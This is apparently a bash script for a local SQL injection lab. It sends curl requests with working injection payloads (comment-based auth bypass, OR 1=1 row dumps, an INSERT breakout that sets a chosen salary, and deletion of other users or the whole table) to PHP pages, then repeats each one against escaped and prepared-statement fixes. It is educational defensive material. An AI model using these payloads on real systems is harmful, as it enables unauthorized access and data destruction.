#!/bin/bash
cd /home/claude/sqli_lab
mkdir -p /run/mysqld && chown mysql:mysql /run/mysqld
mysqld_safe >/tmp/mysql.log 2>&1 &
for i in $(seq 1 20); do mysqladmin -u root -pseedubuntu ping >/dev/null 2>&1 && break; sleep 1; done

php -S 127.0.0.1:8080 -t /home/claude/sqli_lab >/tmp/php.log 2>&1 &
sleep 2

reset_db(){ mariadb -u root -pseedubuntu < setup.sql; }
show(){ mariadb -u root -pseedubuntu -N -e "SELECT ID,Name,EID,Salary,SSN FROM dbtest.employee;" | sed 's/^/      /'; }
line(){ printf '=%.0s' {1..70}; echo; }

reset_db

echo; line; echo "SECTION 1 — SELECT"; line
echo ">> 1.0 Legit login (vuln): EID=EID5000 Password=paswd123"
curl -sG "http://127.0.0.1:8080/select.php" --data-urlencode "mode=vuln" --data-urlencode "EID=EID5000" --data-urlencode "Password=paswd123"

echo; echo ">> 1.1 ATTACK auth-bypass w/ comment (vuln): EID=EID5002'#  Password=wrong"
curl -sG "http://127.0.0.1:8080/select.php" --data-urlencode "mode=vuln" --data-urlencode "EID=EID5002'#" --data-urlencode "Password=wrong"

echo; echo ">> 1.2 ATTACK dump-all OR 1=1 comment (vuln): EID=a' OR 1=1 #  Password=wrong"
curl -sG "http://127.0.0.1:8080/select.php" --data-urlencode "mode=vuln" --data-urlencode "EID=a' OR 1=1 #" --data-urlencode "Password=wrong"

echo; echo ">> 1.3 SAME dump-all attack, FIX1 escape:"
curl -sG "http://127.0.0.1:8080/select.php" --data-urlencode "mode=escape" --data-urlencode "EID=a' OR 1=1 #" --data-urlencode "Password=wrong"

echo; echo ">> 1.4 SAME dump-all attack, FIX2 prepared:"
curl -sG "http://127.0.0.1:8080/select.php" --data-urlencode "mode=prepared" --data-urlencode "EID=a' OR 1=1 #" --data-urlencode "Password=wrong"

echo; echo ">> 1.5 Sanity: legit login still works under prepared:"
curl -sG "http://127.0.0.1:8080/select.php" --data-urlencode "mode=prepared" --data-urlencode "EID=EID5000" --data-urlencode "Password=paswd123"

echo; line; echo "SECTION 2 — INSERT"; line
reset_db
echo ">> 2.0 Legit register (vuln): Name=Eve EID=EID6000 Password=p"
curl -sG "http://127.0.0.1:8080/insert.php" --data-urlencode "mode=vuln" --data-urlencode "Name=Eve" --data-urlencode "EID=EID6000" --data-urlencode "Password=p"
echo "   table now:"; show

echo; echo ">> 2.1 ATTACK salary-escalation via breakout (vuln): Password=p', 999999, '111-11-1111') -- "
curl -sG "http://127.0.0.1:8080/insert.php" --data-urlencode "mode=vuln" --data-urlencode "Name=Mallory" --data-urlencode "EID=EID6001" --data-urlencode "Password=p', 999999, '111-11-1111') -- "
echo "   table now (note Mallory's salary):"; show

echo; echo ">> 2.2 SAME insert attack, FIX1 escape:"
curl -sG "http://127.0.0.1:8080/insert.php" --data-urlencode "mode=escape" --data-urlencode "Name=Mallory2" --data-urlencode "EID=EID6002" --data-urlencode "Password=p', 999999, '111-11-1111') -- "
echo "   table now (Mallory2 salary should be 50000):"; show

echo; echo ">> 2.3 SAME insert attack, FIX2 prepared:"
curl -sG "http://127.0.0.1:8080/insert.php" --data-urlencode "mode=prepared" --data-urlencode "Name=Mallory3" --data-urlencode "EID=EID6003" --data-urlencode "Password=p', 999999, '111-11-1111') -- "
echo "   table now (Mallory3 salary should be 50000, pwd stored literally):"; show

echo; line; echo "SECTION 3 — DELETE"; line
reset_db
echo ">> 3.0 Legit self-delete (vuln): EID=EID5003 Password=paswd123 (David deletes himself)"
curl -sG "http://127.0.0.1:8080/delete.php" --data-urlencode "mode=vuln" --data-urlencode "EID=EID5003" --data-urlencode "Password=paswd123"
echo "   table now:"; show

reset_db
echo; echo ">> 3.1 ATTACK delete-another-user via comment (vuln): EID=EID5001' --  (Bob, no password)"
curl -sG "http://127.0.0.1:8080/delete.php" --data-urlencode "mode=vuln" --data-urlencode "EID=EID5001' -- " --data-urlencode "Password=wrong"
echo "   table now (Bob gone):"; show

reset_db
echo; echo ">> 3.2 ATTACK wipe whole table OR 1=1 comment (vuln): EID=x' OR 1=1 #  Password=wrong"
curl -sG "http://127.0.0.1:8080/delete.php" --data-urlencode "mode=vuln" --data-urlencode "EID=x' OR 1=1 #" --data-urlencode "Password=wrong"
echo "   table now (should be EMPTY):"; show

reset_db
echo; echo ">> 3.3 SAME wipe attack, FIX1 escape:"
curl -sG "http://127.0.0.1:8080/delete.php" --data-urlencode "mode=escape" --data-urlencode "EID=x' OR 1=1 #" --data-urlencode "Password=wrong"
echo "   table now (should be intact, 4 rows):"; show

reset_db
echo; echo ">> 3.4 SAME wipe attack, FIX2 prepared:"
curl -sG "http://127.0.0.1:8080/delete.php" --data-urlencode "mode=prepared" --data-urlencode "EID=x' OR 1=1 #" --data-urlencode "Password=wrong"
echo "   table now (should be intact, 4 rows):"; show
echo; line; echo "DONE"; line
